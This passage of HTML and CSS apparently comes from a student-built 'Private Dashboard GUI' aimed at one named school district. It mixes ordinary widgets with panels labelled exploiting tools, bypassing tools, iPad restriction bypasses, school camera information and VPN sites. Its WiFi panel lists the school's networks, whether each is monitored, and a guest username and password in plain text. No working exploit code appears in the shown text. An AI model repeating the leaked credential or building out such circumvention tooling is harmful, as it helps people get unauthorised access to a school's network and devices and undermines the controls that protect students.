        animation: fadeIn 0.3s ease-out;
    }

    .notes-text-popup textarea {
        width: 100%;
        height: 100px;
        margin-bottom: 10px;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid #555;
        background: #3a3a3a;
        color: white;
        resize: vertical;
        font-size: 0.9em;
        outline: none;
    }
    .notes-text-popup button {
        background-color: #ff914d;
        border: none;
        padding: 8px 12px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
        margin-left: 5px;
    }
    .notes-text-popup button:hover {
        background-color: #ffb67a;
    }

    .motivation-box {
      background-color: #333;
      color: #ffd966;
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      flex-direction: column; /* To stack quote and button */
      gap: 10px;
    }

    .motivation-box button {
      background-color: #ff914d;
      border: none;
      padding: 8px 12px;
      border-radius: 6px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 10px;
    }
    .motivation-box button:hover {
      background-color: #ffb67a;
    }

    /* Info Panel Styles (General for all info panels) */
    .info-panel, .settings-panel, .utility-panel, .activity-history-panel, .keybinds-panel, .time-tools-panel {
      display: none; /* Hide by default */
      /* These were moved to .box, #canvasContainer etc to prevent double definitions for common styles */
    }

    /* Wifi Panel Colors */
    .wifi-entry .level-high { background-color: #28a745; color: white; } /* Green */
    .wifi-entry .level-medium { background-color: #ffc107; color: black; } /* Yellow */
    .wifi-entry .level-low { background-color: #dc3545; color: white; } /* Red */
    .wifi-entry div:not([class*="level-"]) { /* Default background for others */
      background: #40210f;
    }


    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      border-radius: 6px;
      text-align: center;
      overflow: hidden; /* Hide overflow text */
      text-overflow: ellipsis; /* Add ellipsis */
      white-space: nowrap; /* Prevent wrapping */
    }

    .handbook-buttons {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons button, .handbook-buttons a {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
    }

    .handbook-buttons button:hover, .handbook-buttons a:hover {
      background-color: #ffb67a;
    }

    .links-list {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .links-list a {
      display: block;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
    }

    .links-list a:hover {
      background-color: #ffb67a;
    }

    .exploit-buttons {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .exploit-buttons a {
      display: block;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
    }

    .exploit-buttons a:hover {
      background-color: #ffb67a;
    }

    .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .bypass-buttons button:hover {
      background-color: #ffb67a;
    }

    .coming-soon {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
    }

    .info-text {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
    }

    .school-info-label {
      font-weight: bold;
      color: #ff914d;
      margin-bottom: 5px;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .ipad-options button:hover {
      background-color: #ffb67a;
    }

    .ipad-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }
    
    .bypass-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    /* Alert System */
    #alertContainer {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 300px;
      max-height: 80vh;
      overflow-y: auto;
      z-index: 2000;
      display: flex;
      flex-direction: column;
      gap: 10px;
      padding: 10px;
      background-color: rgba(0,0,0,0.7);
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
      backdrop-filter: blur(5px);
    }
    .alert {
      background-color: #40210f;
      color: #ffccb3;
      padding: 10px;
      border-radius: 8px;
      border-left: 5px solid #ff914d;
      display: flex;
      justify-content: space-between;
      align-items: center;
      opacity: 1;
      transition: opacity 0.5s ease-out;
      font-size: 0.9em;
    }
    .alert.fade-out {
      opacity: 0;
    }
    .alert-close {
      background: none;
      border: none;
      color: #ff914d;
      font-weight: bold;
      cursor: pointer;
      font-size: 1.2em;
      margin-left: 10px;
      line-height: 1;
    }
    .alert-close:hover {
      color: white;
    }

    /* Calculator & Unit Converter Styles */
    #calculator, #unitConverter, #mediaPlayer, #keybindsPanel, #activityHistoryPanel, #loginHistoryPanel,
    #reminderPanel, #timeToolsPanel, #statsPanel {
      /* Shared styles moved to common panel classes */
    }
    #calculator .calculator-grid, #unitConverter .converter-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 8px;
      margin-top: 15px;
    }
    #calculator input, #unitConverter input, #unitConverter select {
        width: 100%;
        padding: 10px;
        border-radius: 6px;
        border: 1px solid #555;
        background: #3a3a3a;
        color: white;
        font-size: 1em;
        margin-bottom: 10px;
        grid-column: span 4;
        outline: none;
    }
    #calculator button, #unitConverter button {
        background-color: #ff914d;
        border: none;
        padding: 12px 10px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
        font-size: 1em;
    }
    #calculator .operator, #calculator .equals { background-color: #007bff; color: white; }
    #calculator .clear { background-color: #dc3545; color: white; }
    #calculator button:hover, #unitConverter button:hover { background-color: #ffb67a; }

    #unitConverter select {
        background: #3a3a3a url("data:image/svg+xml;utf8,<svg fill='white' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/><path d='M0 0h24v24H0z' fill='none'/></svg>") no-repeat right 10px center;
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        padding-right: 30px;
    }

    /* Media Player Styles */
    #mediaPlayer .media-content {
      margin-top: 15px;
      background: #1c1c1c;
      border-radius: 8px;
      overflow: hidden;
      padding: 10px;
    }
    #mediaPlayer .media-content iframe {
      width: 100%;
      height: 315px; /* Standard YouTube embed height */
      border: none;
      border-radius: 6px;
    }

    /* Keybinds Panel Styles */
    .keybinds-entry {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background: #40210f;
        padding: 8px;
        margin-bottom: 8px;
        border-radius: 6px;
        color: #ffccb3;
    }
    .keybinds-entry span:first-child {
        flex: 1;
        font-weight: bold;
    }
    .keybinds-entry input {
        width: 80px;
        padding: 5px;
        background: #3a3a3a;
        border: 1px solid #555;
        border-radius: 4px;
        color: white;
        text-align: center;
        outline: none;
    }

    /* Activity and Login History Panels */
    .activity-log-entry, .login-history-entry {
        background: #40210f;
        padding: 8px;
        margin-top: 5px;
        border-radius: 6px;
        color: #ffccb3;
        font-size: 0.9em;
        overflow-wrap: break-word; /* Ensure long content breaks */
    }
    .activity-log-entry strong { color: #ffd966; }

    /* Reminder Panel */
    #reminderPanel input[type="datetime-local"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border-radius: 6px;
        border: 1px solid #555;
        background: #3a3a3a;
        color: white;
        font-size: 1em;
        outline: none;
    }

    /* Timer/Stopwatch/Countdown styles */
    .timer-display {
      font-size: 2.5em;
      font-family: 'Courier New', monospace;
      color: #ff914d;
      margin: 20px 0;
      text-align: center;
      display: block;
      width: 100%;
    }
    .timer-buttons {
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-wrap: wrap;
    }
    .timer-input {
      width: calc(100% - 20px);
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 6px;
      border: 1px solid #555;
      background: #3a3a3a;
      color: white;
      font-size: 1em;
      outline: none;
      text-align: center;
    }
    #timeToolsNav {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 15px;
    }
    #timeToolsNav button {
      background-color: #007bff;
      color: white;
      padding: 8px 15px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      transition: background 0.2s;
    }
    #timeToolsNav button.active, #timeToolsNav button:hover {
      background-color: #0056b3;
    }
    #timerControls, #stopwatchControls, #countdownControls {
      text-align: center;
    }

    /* Stats Panel */
    .stats-entry {
        display: flex;
        justify-content: space-between;
        background: #40210f;
        padding: 8px;
        margin-bottom: 8px;
        border-radius: 6px;
        color: #ffccb3;
    }
    .stats-entry strong { color: #ffd966; }
    .stats-entry span { background: #333; padding: 3px 8px; border-radius: 4px; }

    /* Settings Panel */
    .settings-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 15px;
      margin-top: 15px;
    }
    .settings-option {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
      color: #ffccb3;
      display: flex;
      flex-direction: column;
      gap: 8px;
      justify-content: space-between;
    }
    .settings-option label {
      font-weight: bold;
      color: #ffd966;
    }
    .settings-option input[type="range"] {
      width: 100%;
      -webkit-appearance: none;
      appearance: none;
      height: 8px;
      background: #ff914d;
      border-radius: 50px; /* More modern slider track */
      outline: none;
      transition: opacity .2s;
    }
    .settings-option input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: #ffffff;
      cursor: pointer;
      box-shadow: 0 0 3px rgba(0,0,0,0.5);
    }
    .settings-option input[type="range"]::-moz-range-thumb {
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: #ffffff;
      cursor: pointer;
      box-shadow: 0 0 3px rgba(0,0,0,0.5);
    }

    .settings-option input[type="checkbox"].slider-checkbox + .slider {
      background-color: #dc3545; /* Red off */
    }
    .settings-option input[type="checkbox"].slider-checkbox:checked + .slider {
      background-color: #28a745; /* Green on */
    }
    .settings-option select {
      width: 100%;
      padding: 8px;
      border-radius: 6px;
      border: 1px solid #555;
      background: #3a3a3a;
      color: white;
      font-size: 0.9em;
      outline: none;
      -webkit-appearance: none; /* Remove default arrow */
      -moz-appearance: none;
      appearance: none;
      background-image: url('data:image/svg+xml;utf8,<svg fill="white" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>');
      background-repeat: no-repeat;
      background-position: right 8px center;
      padding-right: 30px; /* Make space for the arrow */
    }
    .settings-option button {
        background-color: #ff914d;
        border: none;
        padding: 8px 12px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
    }
    .settings-option button:hover {
        background-color: #ffb67a;
    }

    @media (max-width: 768px) {
      .login-box { width: 95%; padding: 25px 20px; }
      .dashboard-header { flex-direction: column; text-align: center; gap: 10px; padding: 10px; }
      #buttonsArea { flex-direction: column; align-items: stretch; padding: 10px; }
      #buttonsArea button { min-width: unset; width: 100%; }
      #buttonsArea .search-container { max-width: 100%; min-width: unset; width: 100%; }
      .main-row, #updatesNotifications, #additionalPanels, .quick-info-buttons { flex-direction: column; }
      .box, #canvasContainer, .info-panel, .settings-panel, .utility-panel, .notes-content, .activity-history-panel, .keybinds-panel, .login-history-panel, .reminder-panel, .time-tools-panel { flex: 1 1 100%; max-width: 100%; margin: 0 auto 20px auto; }
      .exploit-buttons { grid-template-columns: repeat(2, 1fr); }
      .wifi-grid, .wifi-entry { grid-template-columns: repeat(2, 1fr); }
      #canvasControls button { width: 100%; }
      .login-quick-bar { flex-direction: column; }
    }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Preloader Screen -->
  <div id="preloader">
    <div class="rotating-cube">
      <div class="cube">
        <div class="face front"></div>
        <div class="face back"></div>
        <div class="face right"></div>
        <div class="face left"></div>
        <div class="face top"></div>
        <div class="face bottom"></div>
      </div>
    </div>
    <span id="loadingText">Initializing System...</span>
  </div>

  <!-- Login Page Quick Bar (appears with login page) -->
  <div class="login-quick-bar" id="loginQuickBar" style="display: none;">
    <button id="loginPanicBtn"> Panic</button>
    <button id="loginZoomInBtn"> Zoom In</button>
    <button id="loginZoomOutBtn"> Zoom Out</button>
    <button id="loginActivityLogsBtn"> Activity Logs</button>
    <button id="loginHistoryBtn"> Login History</button>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox" style="display: none;">
    <h2> </h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <div class="toggle-switch-container">
      <label for="showPasswordToggle">Show Password</label>
      <label class="toggle-switch">
        <input type="checkbox" id="showPasswordToggle">
        <span class="slider"></span>
      </label>
    </div>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>

    <!-- Login Page Current Time and Date Box -->
    <div class="login-info-box">
        <div class="login-info-row">
            <span> <span id="currentLoginTime">00:00:00</span></span>
            <span> <span id="currentLoginDate">--</span></span>
        </div>
        <div class="toggle-switch-container" style="justify-content: center;">
            <label for="toggle24HourFormat">24-Hour Format</label>
            <label class="toggle-switch" style="margin-left: 10px;">
                <input type="checkbox" id="toggle24HourFormat">
                <span class="slider"></span>
            </label>
        </div>
        <div id="lastLoginDisplay" style="font-size: 0.8em; color: #888;"></div>
    </div>


    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Alert System Container (Dashboard and Login) -->
  <div id="alertContainer" style="display: none;"></div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <!-- Welcome Notification (Dashboard) -->
    <div id="welcomeNotification"></div>

    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <!-- Main Dashboard Consolidated Button Area -->
    <div id="buttonsArea">
        <div class="search-container">
            <input type="text" id="searchBar" placeholder="Search dashboard sections...">
            <button id="searchButton"></button>
        </div>
        <button id="sessionTime"> Session Time: 00:00:00</button>
        <button id="realTimeClock"> --:--:--</button>
        <button id="realDate"> --</button>
        <button id="notesBtn"> Notes</button>
        <button id="exportNotesBtn"> Export Notes</button>
        <button id="screenshotBtn"> Screenshot</button>
        <button id="toggleSectionsBtn"> Toggle Sections</button>
        <button id="fixIssuesBtn"> Fix Issues</button>
        <button id="fullScreenBtn"> Full Screen</button>
        <button id="zoomInBtn"> Zoom In</button>
        <button id="zoomOutBtn"> Zoom Out</button>
        <button id="restartBtn"> Restart</button>
        <button id="panicBtnDash"> Panic</button>
        <button id="themeToggle"> Themes</button>
        <button id="activityLogsBtn"> Activity Logs</button>
        <button id="loginHistoryDashBtn"> Login History</button>
        <button id="statsBtn"> Stats</button>
        <button id="timerBtn"> Time Tools</button>
        <button id="reminderBtn"> Reminders</button>
        <button id="calculatorBtn"> Calculator</button>
        <button id="unitConverterBtn"> Converter</button>
        <button id="mediaPlayerBtn"> Media Player</button>
        <button id="keybindsBtn"> Keybinds</button>
        <button id="settingsBtn"> Settings</button>
        <button id="downloadActivityLogsBtn"> Download Activity Logs</button>
        <button id="logoutBtn"> Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span> Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! </span>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box draggable" id="calendarBox">
        <h2> Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box draggable" id="motivationBox">
        <span id="motivationQuote">"Success is not final, failure is not fatal: It is the courage to continue that counts."  Winston Churchill</span>
        <button id="refreshQuoteBtn"> New Quote</button>
      </div>
    </div>

    <!-- Additional Panels Row -->
    <div id="additionalPanels" class="main-row">
        <div class="box draggable" id="randomFactBox">
            <h2> Random Fact</h2>
            <p id="randomFactContent"></p>
            <button id="refreshFactBtn"> New Fact</button>
        </div>

        <div class="box draggable" id="dailyQuoteBox">
            <h2> Daily Quote</h2>
            <p id="dailyQuoteContent"></p>
            <button id="refreshDailyQuoteBtn"> New Daily Quote</button>
        </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin-top: 20px;">
      <div class="box draggable" id="updatesBox" style="flex: 1 1 300px; min-width: 300px;">
        <h2> Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box draggable" id="notificationsBox" style="flex: 1 1 300px; min-width: 300px;">
        <h2> Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <!-- This div holds buttons to open information panels, placed outside #buttonsArea -->
    <div class="quick-info-buttons">
      <button onclick="dashboard.togglePanel('wifiPanel', this)"> School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel', this)"> School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel', this)"> Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel', this)"> School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel', this)"> Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel', this)"> Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel', this)"> School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel', this)"> School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel', this)"> School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel', this)"> Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel', this)"> Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel', this)"> VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel', this)"> Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel', this)"> Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel', this)"> Keyboard Tricks</button>
    </div>

    <!-- Information Panels Container -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel draggable">
        <h2> School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div class="level-high">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div class="level-high">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div class="level-medium">Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div class="level-low">Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel draggable">
        <h2> School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel draggable">
        <h2> Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel draggable">
        <h2> School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel draggable">
        <h2> Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel draggable">
        <h2> Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel draggable">
        <h2> School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel draggable">
        <h2> School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel draggable">
        <h2> School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
